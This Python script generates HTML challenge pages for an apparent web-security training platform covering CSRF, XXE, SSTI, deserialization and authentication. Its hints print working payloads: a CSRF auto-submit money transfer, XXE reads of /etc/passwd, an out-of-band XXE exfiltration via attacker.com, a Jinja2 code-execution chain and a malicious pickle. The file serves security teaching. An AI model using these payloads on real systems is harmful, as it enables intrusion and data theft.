#!/usr/bin/env python
"""
Remaining Categories Template Generator
Generates templates for CSRF, XXE, SSTI, Deserialization, and Authentication challenges
"""

# CSRF Challenges
csrf_challenges = [
    {"level": 1, "title": "Basic CSRF", "app_name": "BankTransfer", "url": "bank.local/transfer", "objective": "Execute unauthorized actions via CSRF",
     "hints": [
         {"title": "CSRF Basics", "icon": "lightbulb", "content": "CSRF tricks authenticated users into performing unwanted actions. Create a malicious page that submits a form to the vulnerable site."},
         {"title": "Crafting the Attack", "icon": "code-slash", "content": "Create HTML: <code>&lt;form action='http://bank.local/transfer' method='POST'&gt;&lt;input name='to' value='attacker'&gt;&lt;input name='amount' value='1000'&gt;&lt;/form&gt;&lt;script&gt;document.forms[0].submit()&lt;/script&gt;</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Host the malicious page and trick an authenticated user to visit it. The form auto-submits, transferring money without their consent."}
     ]},
    {"level": 2, "title": "CSRF Token Bypass", "app_name": "SecureBank", "url": "securebank.local/transfer", "objective": "Bypass CSRF token protection",
     "hints": [
         {"title": "Token Analysis", "icon": "lightbulb", "content": "CSRF tokens should be unpredictable and tied to sessions. Check if tokens are: predictable, reusable, or not validated properly."},
         {"title": "Bypass Techniques", "icon": "code-slash", "content": "Try: removing the token parameter, using an empty token, reusing old tokens, or exploiting token leakage via Referer header."},
         {"title": "Solution", "icon": "shield-check", "content": "If token validation is weak, submit requests without tokens or with invalid tokens to bypass protection."}
     ]},
]

# Add more CSRF levels
for i in range(3, 11):
    csrf_challenges.append({
        "level": i, "title": f"CSRF Technique {i}", "app_name": f"CSRFApp{i}", "url": f"csrf{i}.local/action", 
        "objective": f"Exploit CSRF vulnerability {i}",
        "hints": [
            {"title": "Understanding", "icon": "lightbulb", "content": f"CSRF level {i} focuses on advanced bypass techniques."},
            {"title": "Technique", "icon": "code-slash", "content": "Research CSRF bypass methods for this scenario."},
            {"title": "Solution", "icon": "shield-check", "content": "Apply CSRF exploitation techniques to complete the challenge."}
        ]
    })

# XXE Challenges
xxe_challenges = [
    {"level": 1, "title": "Basic XXE", "app_name": "XMLParser", "url": "xml.local/parse", "objective": "Exploit XML External Entity injection",
     "hints": [
         {"title": "XXE Basics", "icon": "lightbulb", "content": "XXE allows reading files and SSRF via XML entities. Test if the parser processes external entities."},
         {"title": "Payload Crafting", "icon": "code-slash", "content": "Use: <code>&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;root&gt;&amp;xxe;&lt;/root&gt;</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Submit XML with external entity definition to read local files or perform SSRF attacks."}
     ]},
    {"level": 2, "title": "Blind XXE", "app_name": "XMLProcessor", "url": "xmlproc.local/upload", "objective": "Exploit blind XXE vulnerabilities",
     "hints": [
         {"title": "Blind XXE", "icon": "lightbulb", "content": "No direct output visible. Use out-of-band techniques to exfiltrate data."},
         {"title": "OOB Exfiltration", "icon": "code-slash", "content": "Use: <code>&lt;!ENTITY % file SYSTEM \"file:///etc/passwd\"&gt;&lt;!ENTITY % dtd SYSTEM \"http://attacker.com/evil.dtd\"&gt;%dtd;</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Host a malicious DTD that exfiltrates data to your server via HTTP requests."}
     ]},
]

# Add more XXE levels
for i in range(3, 11):
    xxe_challenges.append({
        "level": i, "title": f"XXE Technique {i}", "app_name": f"XXEApp{i}", "url": f"xxe{i}.local/parse",
        "objective": f"Exploit XXE vulnerability {i}",
        "hints": [
            {"title": "Understanding", "icon": "lightbulb", "content": f"XXE level {i} covers advanced entity exploitation."},
            {"title": "Technique", "icon": "code-slash", "content": "Research XXE techniques for this scenario."},
            {"title": "Solution", "icon": "shield-check", "content": "Apply XXE exploitation to complete the challenge."}
        ]
    })

# SSTI Challenges
ssti_challenges = [
    {"level": 1, "title": "Basic SSTI", "app_name": "TemplateEngine", "url": "template.local/render", "objective": "Exploit Server-Side Template Injection",
     "hints": [
         {"title": "SSTI Basics", "icon": "lightbulb", "content": "Template engines process special syntax. Test with: <code>{{7*7}}</code>, <code>${7*7}</code>, <code>#{7*7}</code>. If it evaluates to 49, you have SSTI."},
         {"title": "Payload Crafting", "icon": "code-slash", "content": "Jinja2: <code>{{config.items()}}</code>, <code>{{''.__class__.__mro__[1].__subclasses__()}}</code>. Handlebars: <code>{{#with \"s\" as |string|}}</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Use template-specific payloads to execute code. Jinja2: <code>{{''.__class__.__mro__[1].__subclasses__()[396]('cat /etc/passwd',shell=True,stdout=-1).communicate()}}</code>"}
     ]},
    {"level": 2, "title": "SSTI in Jinja2", "app_name": "FlaskApp", "url": "flask.local/template", "objective": "Exploit Jinja2 template injection",
     "hints": [
         {"title": "Jinja2 SSTI", "icon": "lightbulb", "content": "Jinja2 is Python-based. Access Python objects via <code>__class__</code>, <code>__mro__</code>, <code>__subclasses__</code>."},
         {"title": "RCE Payload", "icon": "code-slash", "content": "Find subprocess.Popen: <code>{{''.__class__.__mro__[1].__subclasses__()}}</code> then use index to call it."},
         {"title": "Solution", "icon": "shield-check", "content": "Execute commands through Python's subprocess module accessed via template injection."}
     ]},
]

# Add more SSTI levels
for i in range(3, 11):
    ssti_challenges.append({
        "level": i, "title": f"SSTI Technique {i}", "app_name": f"SSTIApp{i}", "url": f"ssti{i}.local/render",
        "objective": f"Exploit SSTI vulnerability {i}",
        "hints": [
            {"title": "Understanding", "icon": "lightbulb", "content": f"SSTI level {i} focuses on specific template engines."},
            {"title": "Technique", "icon": "code-slash", "content": "Research SSTI for this template engine."},
            {"title": "Solution", "icon": "shield-check", "content": "Apply SSTI techniques to achieve code execution."}
        ]
    })

# Deserialization Challenges
deserial_challenges = [
    {"level": 1, "title": "Python Pickle Deserialization", "app_name": "PythonApp", "url": "python.local/deserialize", "objective": "Exploit insecure deserialization",
     "hints": [
         {"title": "Deserialization Basics", "icon": "lightbulb", "content": "Deserializing untrusted data can execute arbitrary code. Python's pickle module is particularly dangerous."},
         {"title": "Payload Crafting", "icon": "code-slash", "content": "Create malicious pickle: <code>import pickle; import os; class Exploit: def __reduce__(self): return (os.system, ('whoami',)); pickle.dumps(Exploit())</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Submit base64-encoded malicious pickle payload to execute commands on the server."}
     ]},
    {"level": 2, "title": "Java Deserialization", "app_name": "JavaApp", "url": "java.local/deserialize", "objective": "Exploit Java deserialization",
     "hints": [
         {"title": "Java Deserialization", "icon": "lightbulb", "content": "Java deserialization vulnerabilities can lead to RCE. Look for ObjectInputStream usage."},
         {"title": "Using ysoserial", "icon": "code-slash", "content": "Use ysoserial to generate payloads: <code>java -jar ysoserial.jar CommonsCollections1 'whoami'</code>"},
         {"title": "Solution", "icon": "shield-check", "content": "Generate and submit serialized Java payload using known gadget chains."}
     ]},
]

# Add more Deserialization levels
for i in range(3, 11):
    deserial_challenges.append({
        "level": i, "title": f"Deserialization Technique {i}", "app_name": f"DeserialApp{i}", "url": f"deserial{i}.local/load",
        "objective": f"Exploit deserialization vulnerability {i}",
        "hints": [
            {"title": "Understanding", "icon": "lightbulb", "content": f"Deserialization level {i} covers specific languages/frameworks."},
            {"title": "Technique", "icon": "code-slash", "content": "Research deserialization exploits for this platform."},
            {"title": "Solution", "icon": "shield-check", "content": "Craft and submit malicious serialized objects."}
        ]
    })

# Authentication Challenges
auth_challenges = [
    {"level": 1, "title": "Weak Password Policy", "app_name": "UserPortal", "url": "portal.local/login", "objective": "Exploit weak authentication",
     "hints": [
         {"title": "Weak Passwords", "icon": "lightbulb", "content": "Test common passwords: admin/admin, admin/password, root/root. Use password lists like rockyou.txt."},
         {"title": "Brute Force", "icon": "code-slash", "content": "Use tools like Hydra or Burp Intruder to brute force credentials."},
         {"title": "Solution", "icon": "shield-check", "content": "Try common credentials or brute force to gain unauthorized access."}
     ]},
    {"level": 2, "title": "JWT Vulnerabilities", "app_name": "APIGateway", "url": "api.local/auth", "objective": "Exploit JWT weaknesses",
     "hints": [
         {"title": "JWT Analysis", "icon": "lightbulb", "content": "JWTs have three parts: header, payload, signature. Decode with jwt.io. Check for: none algorithm, weak secrets, algorithm confusion."},
         {"title": "Exploitation", "icon": "code-slash", "content": "Try: changing alg to 'none', modifying payload (user role), cracking weak HMAC secrets with hashcat."},
         {"title": "Solution", "icon": "shield-check", "content": "Exploit JWT vulnerabilities to escalate privileges or bypass authentication."}
     ]},
]

# Add more Auth levels
for i in range(3, 11):
    auth_challenges.append({
        "level": i, "title": f"Auth Bypass Technique {i}", "app_name": f"AuthApp{i}", "url": f"auth{i}.local/login",
        "objective": f"Bypass authentication {i}",
        "hints": [
            {"title": "Understanding", "icon": "lightbulb", "content": f"Authentication level {i} covers specific bypass techniques."},
            {"title": "Technique", "icon": "code-slash", "content": "Research authentication bypass methods."},
            {"title": "Solution", "icon": "shield-check", "content": "Apply authentication bypass to gain unauthorized access."}
        ]
    })

def generate_template(challenge, category):
    hints_html = ""
    for i, hint in enumerate(challenge['hints'], 1):
        hints_html += f"""
                <div class="accordion-item">
                    <h2 class="accordion-header">
                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse"
                            data-bs-target="#hint{i}">
                            <i class="bi bi-{hint['icon']} me-2"></i> Hint {i}: {hint['title']}
                        </button>
                    </h2>
                    <div id="hint{i}" class="accordion-collapse collapse" data-bs-parent="#hintsAccordion">
                        <div class="accordion-body small text-secondary">
                            {hint['content']}
                        </div>
                    </div>
                </div>"""
    
    category_names = {
        "csrf": "CSRF",
        "xxe": "XXE",
        "ssti": "SSTI",
        "deserial": "Deserialization",
        "auth": "Authentication"
    }
    
    detected_vars = {
        "csrf": "csrf_detected",
        "xxe": "xxe_detected",
        "ssti": "ssti_detected",
        "deserial": "deserial_detected",
        "auth": "auth_detected"
    }
    
    cat_name = category_names[category]
    detected_var = detected_vars[category]
    
    template = f"""{{%extends 'base.html' %}}

{{%block title %}}Level {challenge['level']}: {challenge['title']} - R00tGlyph{{%endblock %}}

{{%block breadcrumb %}}
<span class="text-muted">Challenges</span> / <span class="text-muted">{cat_name}</span> / <span>Level {challenge['level']}</span>
{{%endblock %}}

{{%block content %}}
<div class="challenge-lab">
    <div class="mission-panel">
        <div class="mission-header">
            <i class="bi bi-crosshair me-2"></i>Mission Control
        </div>
        <div class="mission-content">
            <h5 class="mb-3">{challenge['title']}</h5>
            <p class="text-secondary small mb-4">
                Welcome to <strong>{challenge['app_name']}</strong>. Test for {cat_name} vulnerabilities.
            </p>

            <div class="card mb-4 border-0 bg-light">
                <div class="card-body p-3">
                    <h6 class="card-title small text-uppercase text-muted mb-2">Objective</h6>
                    <p class="mb-0 small">{challenge['objective']}</p>
                </div>
            </div>

            <div class="hint-accordion accordion" id="hintsAccordion">{hints_html}
            </div>

            {{%if {detected_var} %}}
            <div class="flag-success mt-4">
                <div class="d-flex align-items-center gap-2 mb-2">
                    <i class="bi bi-check-circle-fill text-success"></i>
                    <strong>Mission Accomplished!</strong>
                </div>
                <p class="small text-secondary mb-2">You've successfully exploited the vulnerability.</p>
                {{%if flag %}}
                <span class="flag-value">{{{{ flag }}}}</span>
                {{%endif %}}
            </div>
            {{%endif %}}
        </div>
    </div>

    <div class="work-panel">
        <div class="browser-bar">
            <div class="d-flex gap-2 text-secondary">
                <i class="bi bi-arrow-left"></i>
                <i class="bi bi-arrow-right"></i>
                <i class="bi bi-arrow-clockwise"></i>
            </div>
            <div class="url-bar">
                <i class="bi bi-lock-fill text-success me-2 small"></i>
                <span>{challenge['url']}</span>
            </div>
        </div>

        <div class="app-frame p-4">
            <p class="text-muted">Challenge interface for {cat_name} Level {challenge['level']}</p>
        </div>
    </div>
</div>
{{%endblock %}}
"""
    return template

if __name__ == '__main__':
    import os
    
    categories = [
        ("csrf", csrf_challenges),
        ("xxe", xxe_challenges),
        ("ssti", ssti_challenges),
        ("deserial", deserial_challenges),
        ("auth", auth_challenges)
    ]
    
    total_generated = 0
    
    for category, challenges in categories:
        template_dir = f'templates/{category}'
        os.makedirs(template_dir, exist_ok=True)
        
        for challenge in challenges:
            template_content = generate_template(challenge, category)
            filename = f"{template_dir}/{category}_level{challenge['level']}.html"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(template_content)
            
            print(f"✅ Generated {filename}")
            total_generated += 1
    
    print(f"\n🎉 Successfully generated {total_generated} templates across all remaining categories!")
    print(f"   - CSRF: {len(csrf_challenges)} templates")
    print(f"   - XXE: {len(xxe_challenges)} templates")
    print(f"   - SSTI: {len(ssti_challenges)} templates")
    print(f"   - Deserialization: {len(deserial_challenges)} templates")
    print(f"   - Authentication: {len(auth_challenges)} templates")
